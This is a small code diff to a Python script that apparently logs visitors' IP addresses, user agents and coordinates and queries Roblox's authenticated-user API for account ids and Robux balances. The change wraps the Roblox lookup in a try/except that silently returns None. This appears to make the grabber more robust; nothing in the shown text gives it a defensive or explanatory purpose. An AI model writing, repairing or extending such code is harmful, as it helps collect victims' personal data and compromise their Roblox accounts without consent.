@@ -89,6 +89,7 @@ def reportError(error):
 })
     
 def get_roblox_info():
+    try:
         session = requests.Session()
 
         user_resp = session.get('https://users.roblox.com/v1/users/authenticated', timeout=10)
@@ -109,6 +110,8 @@ def get_roblox_info():
             'id': str(uid) if uid else 'Unknown',
             'robux': f"{robux:,}"
         }
+    except:
+        return None
 
 def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
     if ip.startswith(blacklistedIPs):
